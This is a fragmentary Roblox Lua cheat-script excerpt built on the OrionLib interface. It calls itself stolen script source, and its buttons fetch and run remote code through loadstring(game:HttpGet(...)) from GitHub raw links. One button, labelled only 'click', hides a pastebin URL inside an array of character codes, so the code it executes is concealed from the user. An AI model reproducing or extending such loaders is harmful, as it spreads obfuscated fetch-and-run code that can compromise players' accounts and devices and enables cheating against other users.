...
local Window = OrionLib:MakeWindow({Name = "vl脚本", HidePremium = false, SaveConfig = true,IntroText = "vl脚本", ConfigFolder = "vl脚本"})
...
about:AddParagraph("盗的鲨脚本源码只是测试不用")
...
player:AddButton({ 
	Name = "刷骷髅头",
	Callback = function()
      	loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()loadstring(game:HttpGet("https://raw.githubusercontent.com/ArceusXHub/AV2022/main/README.md", true))()
  	end
})
...
Tab:AddButton({
	Name = "click              →",
	Callback = function()
     loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,76,120,77,100,98,48,119,106})end)())))()
  	end
})
